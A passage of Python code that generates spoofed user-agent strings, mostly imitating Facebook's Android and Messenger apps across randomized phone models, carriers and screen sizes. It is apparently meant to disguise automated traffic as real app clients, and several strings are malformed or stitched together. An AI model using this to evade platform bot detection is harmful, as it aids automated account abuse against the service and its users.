    model = random.choice(["CPH2411", "CPH2423", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2447", "CPH2449", "CPH2451", "CPH2399", "CPH2401", "CPH2381", "CPH2409", "CPH2459", "CPH2477", "CPH2471", "CPH1923", "CPH1837", "CPH1803", "CPH1853", "CPH1809", "CPH1931", "CPH1933", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2133", "CPH2139", "CPH2135", "CPH2303", "CPH2387", "CPH2407", "CPH2385", "CPH1901", "CPH1905", "CPH2067", "CPH2219", "CPH2339", "CPH2483", "CPH2495", "CPH1937", "CPH1941", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH1920", "CPH1903", "CPH1705fw", "CPH1605", "OPPO CPH1605", "CPH1605fw", "CPH1609", "CPH1609fw", "CPH1613", "CPH1613fw", "CPH1701", "CPH1701fw", "CPH1705", "CPH1707", "CPH1707fw", "CPH1715", "CPH1717", "CPH1719", "CPH1721", "CPH1723", "CPH1725", "CPH1727", "CPH1729", "CPH1801", "CPH1803", "CPH1805", "CPH1807", "CPH1808", "CPH1827", "CPH1851", "CPH1853", "CPH1893", "CPH1893", "CPH1903", "CPH1907", "CPH1909", "CPH1938", "CPH1989", "CPH2001", "CPH2015", "CPH2021", "CPH2031", "CPH2043", "CPH2071", "CPH2073", "CPH2077", "CPH2081", "CPH2083", "CPH2095", "CPH2109", "CPH2113", "CPH2145", "CPH2159", "CPH2161", "CPH2173", "CPH2179", "CPH2185", "CPH21859", "CPH2195", "CPH2197", "CPH2201", "CPH2207", "CPH2211", "CPH2213", "CPH2219", "CPH2223", "CPH2235", "CPH2237", "CPH2239", "CPH2241", "CPH2247", "CPH2249", "CPH2251", "CPH2263", "CPH2269", "CPH2271", "CPH2273", "CPH2275", "CPH2293", "CPH2309", "CPH2325", "CPH2365", "CPH2421", "CPH2455", "CPH2457", "CPH2461", "CPH2473", "CPH1911", "CPH1913", "CPH1915", "CPH1969", "CPH1987", "CPH2119", "CPH2285", "CPH1819", "CPH1821", "CPH1823", "CPH1825", "CPH1881", "CPH2437", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2009", "CPH2025", "CPH2173", "CPH2307", "CPH2305", "CPH1955", "CPH2137", "CPH2321", "CPH2385", "CPH2197", "CPH2341", "CPH2199", "CPH2201", "CPH2237", "CPH2363", "CPH2371", "CPH2371", "CPH2353", "CPH2343", "CPH2343", "CPH2363", "CPH2359", "CPH2357", "CPH1835", "CPH1831", "CPH1833", "CPH1833", "CPH1879", "CPH1877", "CPH1607", "CPH1607fw", "CPH1611", "CPH1917", "CPH1917", "CPH1921", "CPH1919", "CPH1919RU", "CPH1919", "CPH1921", "CPH1907", "CPH2065", "CPH1983", "CPH1979", "CPH1979", "CPH1945", "CPH1951", "CPH2043", "CPH2013", "CPH2009", "CPH2035", "CPH2036", "CPH2037", "CPH2091", "CPH2209", "CPH2125", "CPH2089", "CPH2089", "CPH2159", "CPH2217", "CPH2205", "CPH2343", "CPH2505", "CPH1859", "CPH1861"])
    model1 = random.choice(["Infinix_X689F", "Infinix_X682B", "Infinix_X682C", "Infinix_X657B", "Infinix_X688B", "Infinix_X688C", "Infinix_X657B", "Infinix_X658B", "Infinix_X658E", "Infinix_X659", "Infinix_X659B", "Infinix_X662", "Infinix_X662B", "Infinix_X689F", "Infinix_X675", "Infinix_X6812", "Infinix_X665", "Infinix_X665B", "Infinix_X510", "Infinix_X6827", "Infinix_X665C", "Infinix_X665E", "Infinix_HOT 3 Pro", "Infinix-X554", "Infinix_HOT 3 LTE", "Infinix_HOT 3 LTE", "Infinix_HOT 4", "Infinix_HOT4 LTE", "Infinix_HOT 4", "Infinix_X557", "Infinix_HOT 4", "Infinix_HOT 4", "Infinix_HOT 4 Lite", "Infinix_HOT 4 Pro", "Infinix_X556_LTE", "Infinix_HOT 4 Pro", "Infinix_HOT 4 Pro", "Infinix_X606", "Infinix_X606B", "Infinix_X606C", "Infinix_X606D", "Infinix_X608", "Infinix_X624", "Infinix_X624B", "Infinix_X625B", "Infinix_X625D", "Infinix_X650B", "Infinix_X650C", "Infinix_X650D", "Infinix_X650", "Infinix-X551", "Infinix_X688B", "Infinix_X688C", "Infinix_X573", "Infinix_X573S", "Infinix_X573B", "Infinix_X622", "Infinix_X559C", "Infinix_X559F", "Infinix_X559", "Infinix_HOT 4", "Infinix_HOT 4 Pro", "Infinix_X657B", "Infinix_X689", "Infinix_X689B", "Infinix_X689D", "Infinix_X689C", "Infinix_PR652B", "Infinix_PR652C", "Infinix_X6812B", "Infinix_X6817", "Infinix_X668", "Infinix_X668C", "Infinix_X6816C", "Infinix_X6816D", "Infinix_X6826", "Infinix_X6826B", "Infinix_X6826C", "Infinix_X6835", "Infinix_X6835B", "Infinix_X669", "Infinix_X669C", "Infinix_X669D", "Infinix_X623", "Infinix_X623B", "Infinix_X625C", "Infinix_X625C", "Infinix_X655", "Infinix_X655C", "Infinix_X655D", "Infinix_X680", "Infinix_X680B", "Infinix_X680C", "Infinix_X680E", "Infinix_X680F", "Infinix_X655F", "Infinix_X693", "Infinix_X663B", "Infinix_X693", "Infinix_X663C", "Infinix_X676C", "Infinix_X671", "Infinix_X676B", "Infinix_X671B", "Infinix_X6819", "Infinix_X6833B", "Infinix_X604", "Infinix_X604B", "Infinix_X605", "Infinix_X656", "Infinix_X604", "Infinix_X604B", "Infinix_X680", "Infinix_X680D", "Infinix_X6515", "Infinix_X6516", "Infinix_X5010", "Infinix_X510", "Infinix_X559", "Infinix_X571", "Infinix_X572", "Infinix_X6821", "Infinix_X6815B", "Infinix_X687B", "Infinix_X6811B", "Infinix_X6810", "Infinix_X6811", "Infinix_X687", "Infinix_X663", "Infinix_X695", "Infinix_X695C", "Infinix_X695D", "Infinix_X697", "Infinix_X698", "Infinix_X670", "Infinix_X676B", "Infinix_X672", "Infinix_X677", "Infinix_NOTE 3", "Infinix_NOTE 3 Pro", "Infinix_NOTE 3 Pro", "Infinix_X601_LTE", "Infinix_X572", "Infinix_X572-LTE", "Infinix_X571", "Infinix_X571-LTE", "Infinix_X690", "Infinix_X690B", "Infinix_X690C", "Infinix_X692", "Infinix_X683", "Infinix_X683B", "Infinix_X610B", "Infinix_X454", "Infinix_X455", "Infinix_S2", "Infinix_S2 Pro", "Infinix_X626", "Infinix_X626B", "Infinix_X626B LTE", "Infinix_X652", "Infinix_X652A", "Infinix_X652B", "Infinix_X652C", "Infinix_X660", "Infinix_X660B", "Infinix_X660C", "Infinix_X657", "Infinix_X657B", "Infinix_X657C", "Infinix_X6511", "Infinix_X657B", "Infinix_X6511", "Infinix_X6511B", "Infinix_X6511E", "Infinix_X6512", "Infinix_X6511G", "Infinix_X6823", "Infinix_X6823C", "Infinix_X6517", "Infinix_X612", "Infinix_X612B", "Infinix_X511", "Infinix_X5515", "Infinix_X5515F", "Infinix_X5515I", "Infinix_X609", "Infinix_X609B", "Infinix_X5514D", "Infinix_X5516", "Infinix_X5516B", "Infinix_X5516C", "Infinix_X627", "Infinix_X627V", "Infinix_X627W", "Infinix_X653", "Infinix_X653C", "Infinix_X405", "Infinix_X505", "Infinix_HOT S", "Infinix-X521", "Infinix-X521-LTE", "Infinix_X521", "Infinix-X521", "Infinix-X521", "Infinix_X521", "Infinix_X521_LTE", "Infinix-X521", "Infinix_X521", "Infinix_X521", "Infinix_HOT S", "Infinix-X521", "Infinix_X521", "Infinix-X521", "Infinix-X521_LTE", "Infinix_X521", "Infinix-X521S", "Infinix_X521S", "Infinix_Zero 3", "Infinix-X552", "Infinix-X552", "Infinix_Zero 3", "Infinix-X552", "Infinix_Zero 3", "Infinix-X552", "Infinix_Zero 4", "Infinix_HOT 4", "Infinix_X572", "Infinix_X572-LTE", "Infinix-X600", "Infinix-X600-LTE", "Infinix_X6815", "Infinix_X6815C", "Infinix_X6815D", "Infinix_X6820", "Infinix_X6811", "Infinix_X509", "Infinix_Zero 4", "Infinix_Zero 4 Plus", "Infinix_X603", "Infinix_X603", "Infinix_X603-LTE", "Infinix_X620B", "Infinix_X620", "Infinix_X6515"])
    sim = random.choice(["Verizon","T-Mobile","Visible","US Mobile","Mint Mobile","Boost Mobile","Xfinity"])
    sim1 = random.choice(["Verizon","T-Mobile","Visible","US Mobile","Mint Mobile","Boost Mobile","Xfinity"])
    density = random.choice(["1.5","2.0","3.0"])
    width = random.choice(["540","720","1080"])
    height = str(random.randrange(999,2480))
    density1 = random.choice(["1.5","2.0","3.0"])
    width1 = random.choice(["540","720","1080"])
    height1 = str(random.randrange(999,2480))
    user_agent = f"[FBAN/FB4A;FBAV/"+str(app_ver)+";FBBV/"+str(app_ver_code)+";FBDM/"+"{density="+str(density)+",width="+str(width)+",height="+str(height)+"};FBLC/en_US;FBCR/"+str(sim)+";FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/"+str(model)+";FBSV/"+str(and_ver)+";FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FB4A/;FBAV/YZWSES93;FBBV/342657617;FBAN/FB4A;FBAV/YZWSES93;FBBV/342657617;FBDM//*{density=3.0,width=1080,height=2560};FBLC/ja_JP;FBRV/554638314;FBCR/TECNO;FBMF/Xiaomi;FBBD/Megagate;FBPN/com.facebook.katana;FBDV/Motorola_Moto_G200;FBSV/16;FBOP/6;FBCA/armeabi;]"
    user_agents.append(f'"{user_agent}"')
    return user_agent

def userag2():
    fb_v1=str(random.choice(range(111,555)))
    fb_v2=str(random.choice(range(111,555)))
    rdp1=str(random.choice(range(111111111,433333333)))
    rdp2=str(random.choice(range(111111111,433333333)))
    andv=str(random.choice(range(8,12)))
    ua="Dalvik/2.1.0 (Linux; U; Android "+andv+".1.1; vivo V3Max Build/LMY47V) [FBAN/Orca-Android;FBAV/"+fb_v1+".0.0.16."+fb_v2+";FBPN/com.facebook.orca;FBLC/en_US;FBBV/"+rdp1+";FBCR/null;FBMF/vivo;FBBD/vivo;FBDV/vivo V3Max;FBSV/"+andv+".1.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920"
    return ua

def fuckx():
	model = random.choice(["SM-J200H", "SM-J320H", "SM-J400F", "SM-J510H", "SM-G570F", "SM-J600FN", "SM-J710F", "SM-J730F", "SM-J810M", "SM-N950X", "SM-A013F", "SM-A500M", "SM-A515F"])
	ufff = "[FBAN/FB4A;FBAV/451.0.0.45.109;FBBV/449217850;[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/"+"{density=3.0,width=1080,height=1920}"+f";FBLC/en_US;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	return ufff

def __fuck1__():
	model = random.choice(["CPH1931","CPH1803","CPH1909","CPH1901","PDBM00","CPH2083"])
	ufff = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/"+"{density=2.0,width=720,height=1456}"+f";FBLC/en_US;FBRV/273474118;FBCR/I TIM;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/{model};FBSV/8.1.0;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]"
	return ufff
	
def __fuck2__():
	model = random.choice(["RMX2185","RMX2189","RMX2180","RMX2101","RMX3063","RMX3201","RMX3193","RMX2151","RMX3085","RMX2193"])
	ufff = "[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/FB4A;FBAV/365.0.0.30.112;FBBV/367653576;FBDM/"+"{density=2.25,width=720,height=1400}"+";FBLC/en_Qaau_US;FBRV/369757394;FBCR/Grameenphone;FBMF/Realme;FBBD/Realme;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/1;FBCA/arm64-v8a:;]"
	return ufff

def generate_realistic_ua():
    brands = ["Redmi Note", "Vivo", "Samsung", "Realme", "OnePlus"]
    brand = random.choice(brands)
    ver = f"{random.randint(200,350)}.0.0.{random.randint(0,99)}.{random.randint(0,99)}"
    build = f"QKQ1.{random.randint(111111,999999)}"
    android = random.randint(6,13)
    model = f"{brand} {random.randint(4,12)} Pro"
    return f"Dalvik/2.1.0 (Linux; U; Android {android}; {model} Build/{build}) [FBAN/FB4A;FBAV/{ver};FBLC/en_US;FBBV/{random.randint(100000,300000)};FBCR/NT;FBMF/{brand};FBBD/{brand};FBPN/com.facebook.katana;FBDV/{model};FBSV/{android};FBOP/1;FBCA/armeabi-v7a:armeabi]"

def rnua():
    android_versions = ['7.0', '8.0', '8.1.0', '9', '10', '11', '12', '13', '14']
    chrome_versions = [
        '80.0.3987.99', '83.0.4103.106', '86.0.4240.198', '90.0.4430.91',
        '95.0.4638.74', '100.0.4896.127', '107.0.0.0', '110.0.5481.77',
        '115.0.5790.171', '120.0.6099.129', '125.0.6422.112'
    ]
    signal_versions = ['5.0.0', '6.0.0', '6.10.0', '6.20.0', '7.0.0', '7.2.0', '7.4.0']
    android_version = random.choice(android_versions)
    chrome_version = random.choice(chrome_versions)
    signal_version = random.choice(signal_versions)
    device = random.choice([
        'Pixel 6', 'Pixel 6a', 'Pixel 7', 'Pixel 7 Pro', 'Pixel 8', 'Pixel 8 Pro',
        'Redmi Note 10 Pro', 'Samsung Galaxy S21', 'OnePlus 9', 'Nothing Phone 1'
    ])
    ua = (
        f"Mozilla/5.0 (Linux; Android {android_version}; {device}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{chrome_version} Mobile Safari/537.36 "
        f"Signal/{signal_version}"
    )
    return ua

def f4():
    poco_models = ['Poco F1', 'Poco X3 NFC', 'Poco M3', 'Poco F2 Pro', 'Poco X4 Pro', 'Poco M4 Pro']
    user_agent = (
        f"[FBAN/FB4A;FBAV/{random.randint(111, 999)}.0.0.{random.randint(1111, 9999)};FBBV/"
        f"{random.randint(1111111, 9999999)};FBDM/{{density=2.0,width=1080,height=2400}};FBLC/en_US;FBRV/"
        f"{random.randint(111111111, 666666666)};FBCR/Airalo;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/"
        f"{random.choice(poco_models)};FBSV/11;FBOP/1;FBCA/arm64-v8a:armeabi-v7a;]"
    )
    return user_agent

def best_redmi_ua():
    redmi_best_models = [
        {"model": "Redmi Note 13", "code": "2312DRAABC", "android": "13", "resolution": (1080, 2400)},
        {"model": "Redmi 12", "code": "23053RN02L", "android": "13", "resolution": (1080, 2460)},
        {"model": "Redmi Note 11", "code": "2109119DG", "android": "13", "resolution": (1080, 2400)}
    ]
    selected = random.choice(redmi_best_models)
    density = round(random.uniform(2.5, 3.5), 2)
    width, height = selected["resolution"]
    ua = (
        f"[FBAN/FB4A;"
        f"FBAV/449.0.0.9.105;"
        f"FBBV/298672707;"
        f"FBDM/{{density={density},width={width},height={height}}};"
        f"FBLC/bn_BD;"
        f"FBRV/299927973;"
        f"FBCR/Grameenphone;"
        f"FBMF/Xiaomi;"
        f"FBBD/Redmi;"
        f"FBPN/com.facebook.katana;"
        f"FBDV/{selected['code']};"
        f"FBSV/{selected['android']};"
        f"FBOP/1;"
        f"FBCA/arm64-v8a:;]"
    )
    return ua

def redmiua():
    android_versions = ['7.0', '7.1.1', '8.0.0', '8.1.0', '9', '10', '11', '12', '13']
    redmi_models = [
        'Redmi Note 7', 'Redmi Note 7 Pro', 'Redmi Note 8', 'Redmi Note 8T', 'Redmi Note 8 Pro',
        'Redmi Note 9', 'Redmi Note 9 Pro', 'Redmi Note 9S', 'Redmi Note 10', 'Redmi Note 10S',
        'Redmi Note 10 Pro', 'Redmi Note 11', 'Redmi Note 11 Pro', 'Redmi Note 12', 'Redmi 7A',
        'Redmi 8A', 'Redmi 9A', 'Redmi 10A']
    android_version = random.choice(android_versions)
    redmi_model = random.choice(redmi_models)
    miui_version = f"V{random.randint(10, 13)}.0.{random.randint(1, 20)}.0"
    user_agent = (
        f"Dalvik/2.1.0 (Linux; U; Android {android_version}; {redmi_model} MIUI/{miui_version}) "
        f"[FBAN/Orca-Android;FBAV/{random.randint(200, 350)}.0.0.{random.randint(10, 80)}.{random.randint(10, 300)};"
        f"FBPN/com.facebook.orca;FBLC/en_US;FBBV/{random.randint(100000000, 300000000)};"
        f"FBCR/PLAY;FBMF=Xiaomi;FBBD=xiaomi;FBDV={redmi_model};FBSV={android_version};"
        f"FBCA/arm64-v8a:null;FBDM={{density=2.75,width=1080,height=2130}};FB_FW/1;] FBBK/1"
    )
    return user_agent

def UA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/Orca-Android;FBAV/130.0.0.15.89;FBPN/com.facebook.orca;FBLC/sv_SE;FBBV/67467545;FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/GT-I9505;FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
    c = ";[FBAN/Orca-Android;FBAV/44.0.0.8.52;FBPN/com.facebook.orca;FBLC/en_US;FBBV/16048044;FBCR/cricket;FBMF/zte;FBBD/zte;FBDV/Z987;FBSV/4.4.4;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1184};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/220.0.0.20.121;FBPN/com.facebook.orca;FBLC/en_US;FBBV/159507260;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBDV/SM-G950U;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=4.0,width=1440,height=2768};FB_FW/1;]"
    d = ";[FBAN/Orca-Android;FBAV/230.0.0.12.117;FBPN/com.facebook.orca;FBLC/en_EG;FBBV/169378254;FBCR/Android;FBMF/samsung;FBBD/samsung;FBDV/SM-N9005;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=720,height=1280};FB_FW/1;]"+"[FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/182747440;FBCR/TRUE-H;FBMF/OPPO;FBBD/OPPO;FBDV/CPH1909;FBSV/8.1.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1424,height=720};FB_FW/1;]"
    ua = a+b+c+d
    return ua
    
def UA1():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua    

def UAA():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"+"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
    ua = a+b
    return ua

def UAA2():
    dal = "Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/QP1A.{random.randint(111111,999999)}.{random.randint(111,999)}))"
    a = "[FBAN/FB4A;FBAV/"+str(random.randint(49,66))+'.0.0.'+str(random.randrange(20,49))+str(random.randint(11,99)) +";FBBV/"+str(random.randint(11111111,77777777))
    b = ";[FBAN/FB4A;FBAV/;FBBV/;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X521;FBSV/6.0;]"+"[FBAN/FB4A;FBAV/222.0.0.16.116;FBBV/71583955;FBDM/{density=2.75,width=1080,height=2340};FBLC/en_US;FBRV/71583955;FBCR/MTN;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix X680B;FBSV/11;FBCA/arm64-v8a:;FBDM/{density=2.625,width=1080,height=2340};FB_FW/1;]"+"[FBAN/FB4A;FBAV/;FBBV/;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBCR/;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-G900F;FBSV/5.0;]"
    ua = a+b
    return ua

def B1():
    a = "[FBAN/FB4A;FBAV/" + str(random.randint(49, 66)) + ".0.0." + str(random.randrange(20, 49)) + str(random.randint(11, 99)) + ";FBBV/" + str(random.randint(11111111, 77777777))
    b = random.choice([
        ";[FBAN/FB4A;FBAV/75.0.0.39.59;FBBV/525089766;FBDM/{density=2.0,width=1080,height=2400};FBLC/en_US;FBRV/564541635;FBCR/Verizon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A528B;FBSV/11.0;FBOP/1;FBCA/armeabi-v7a;]",
        ";[FBAN/FB4A;FBAV/653.0.0.4929[FBAN/Orca-Android;FBAV/359.0.0.35.120;FBBV/552727041;FBRV/0;FBPN/com.facebook.orca;FBLC/en_US;FBMF/TECNO MOBILE LIMITED;FBBD/TECNO;FBDV/TECNO KE5;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]", 
    ])
    ua = a + b
    return ua

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

class UserAgentGenerator:
    def __init__(self):
        self.custom_user_agents = [
            'Mozilla/5.0 (Linux; Android 12; SM-A127F Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36 [FBAN/FB4A;FBAV/395.0.0.35.120;FBBV/345678;FBDM/{density=2.0,width=720,height=1600};FBLC/en_US;FBRV/412345;FBCR/T-Mobile;FBMF/Samsung;FBBD/Samsung;FBPN/com.facebook.katana;FBDV/SM-A127F;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]',
            '[FBAN/Orca-Android;FBAV/570.0.0.388.460;FBBV/91567890;FBDM/{density=2.75,width=1080,height=2400};FBLC/en_US;FBCR/T-Mobile;FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.orca;FBDV/moto g52;FBSV/13;FBOP/1;FBCA/arm64-v8a;]']
    def _generate_mozilla_user_agent(self):
        android_version = random.randint(4, 13)
        device = random.choice(('SM-G900F', 'SM-G920F', 'SM-T535'))
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}', '{density=2.5,width=1080,height=2400}'))
        chrome_version = f"{random.randint(100, 150)}.0.0.0"
        return (f"Mozilla/5.0 (Linux; Android {android_version}; {device}) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_version} "
                f"Mobile Safari/537.36 [{resolution}]")
    def _generate_facebook_user_agent(self):
        fb_versions = ['143.0.0.19.100', '81.0.0.22.70']
        build_versions = ['282124661', '144693238']
        fb_version = random.choice(fb_versions)
        build_version = random.choice(build_versions)
        lang = random.choice(('en_US', 'en_GB', 'en_PK', 'en_PH'))
        carrier = random.choice(('Zong', 'Jazz', 'Telenor'))
        app = random.choice(('com.facebook.katana', 'com.facebook.orca', 'com.facebook.mlite'))
        device = random.choice(('Xiaomi', 'Infinix', 'Samsung'))
        model = random.choice(('X5510', 'X601', 'Xiaomi 14 Ultra'))
        resolution = random.choice(('{density=1.5,width=720,height=1280}', '{density=3.5,width=1440,height=3040}', '{density=2.5,width=1080,height=2400}'))
        android_version = random.randint(4, 13)
        return (f"[FBAN/FB4A;FBAV/{fb_version};FBBV/{build_version};FBDM/{resolution};"
                f"FBLC/{lang};FBCR/{carrier};FBMF/{device};FBDV/{model};"
                f"FBSV/Android {android_version};FBPN/{app}]")
    def _generate_dalvik_user_agent(self):
        dalvik_version = f"{random.randint(1, 3)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
        android_version = random.randint(4, 13)
        device = random.choice(('SM-G920F', 'SM-T535',))
        return (f"Dalvik/{dalvik_version} (Linux; U; Android {android_version}; {device})")
    def _generate_iphone_user_agent(self):
        ios_version = random.randint(6, 17)
        device = random.choice(('iPhone 5', 'iPhone 6',))
        resolution = random.choice(('{density=2.0,width=750,height=1334}', '{density=3.0,width=1125,height=2436}', '{density=3.5,width=1242,height=2688}'))
        safari_version = f"{random.randint(14, 16)}.0"
        return (f"Mozilla/5.0 (iPhone; CPU iPhone OS {ios_version} like Mac OS X) "
                f"AppleWebKit/537.36 (KHTML, like Gecko) Version/{safari_version} "
                f"Mobile/15E148 Safari/537.36 [{resolution}]")
    def _generate_facebook_orca_user_agent(self):
        return self._generate_facebook_user_agent().replace('FB4A', 'Orca-Android').replace('katana', 'orca')
    def _generate_facebook_katana_user_agent(self):
        return self._generate_facebook_user_agent()
    def generate_user_agent(self):
        user_agent_type = random.choice(('Mozilla', 'Facebook', 'Dalvik', 'iPhone', 'FacebookOrca', 'FacebookKatana', 'Custom'))
        if user_agent_type == 'Mozilla':
            return self._generate_mozilla_user_agent()
        elif user_agent_type == 'Facebook':
            return self._generate_facebook_user_agent()
        elif user_agent_type == 'Dalvik':
            return self._generate_dalvik_user_agent()
        elif user_agent_type == 'iPhone':
            return self._generate_iphone_user_agent()
        elif user_agent_type == 'FacebookOrca':
            return self._generate_facebook_orca_user_agent()
        elif user_agent_type == 'FacebookKatana':
            return self._generate_facebook_katana_user_agent()
        elif user_agent_type == 'Custom':
            return random.choice(self.custom_user_agents)
user_agent_generator = UserAgentGenerator()

def sm():
    Anderson = random.choice([
        '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', '8.0.0', 
        '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', '6.0.1', '9.0.1'])
    model = random.choice([
        'GT-I9505', 'SM-T835', 'SM-S901U', 'MMB29K', 'SM-S134DL', 'SM-J250F', 
        'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 'SM-A326U', 'SM-G532M', 
        'SM-J410G', 'SM-A205GN', 'SM-A505GN', 'SM-G930F', 'SM-J210F', 'SM-N9005'])
    vir = str(random.choice(range(111111111, 999999999)))
    cho = str(random.choice(range(43, 447)))
    fb = random.choice([
        'com.facebook.adsmanager|MobileAdsManagerAndroid', 
